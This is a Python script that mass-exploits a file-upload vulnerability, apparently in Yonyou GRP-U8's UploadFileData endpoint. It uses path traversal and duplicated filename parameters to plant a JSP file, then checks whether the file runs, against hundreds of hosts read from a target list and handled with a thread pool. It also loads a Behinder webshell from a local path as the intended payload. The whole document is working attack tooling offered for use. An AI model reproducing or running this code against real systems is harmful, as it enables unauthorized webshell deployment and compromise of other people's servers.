import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

with open(r"D:\youxi\0x7eTools\Tools\WebShell\webshell_Manage\Behinder\Behinder_v4.0.6\server\shell.jsp", "r",encoding='utf8') as f:
        file = f.read()
file_content=file

def exploit(ip_, index):
    try:

        url = ip_+'/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=mike.jsp&filename=1.jpg'
        # print(index,url)
        headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
           "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh-CN,zh;q=0.9",
           "Upgrade-Insecure-Requests": "1",
           "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary92pUawKc"}
        files = {"myFile": ("mike.jpg", '<% out.println("123");%>')}
        
        # files = {"myFile": ("test.jpg", file)}
        res = requests.get(url, headers=headers,files=files, timeout=8, verify=False)
        if res.status_code!=200 or "此接口已停用" in res.tex:
            return
        print(res, len(res.text))
        print(index,ip_)
        print(res.text)
        get_ip=ip_+"/R9iPortal/mike.jsp"
        get_res=requests.get(get_ip, timeout=8, verify=False)
        if get_res.status_code==200:
            print(get_ip)
            print(get_res)
            print(get_res.text)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\GRP-U8.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 400
        end = start+600

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()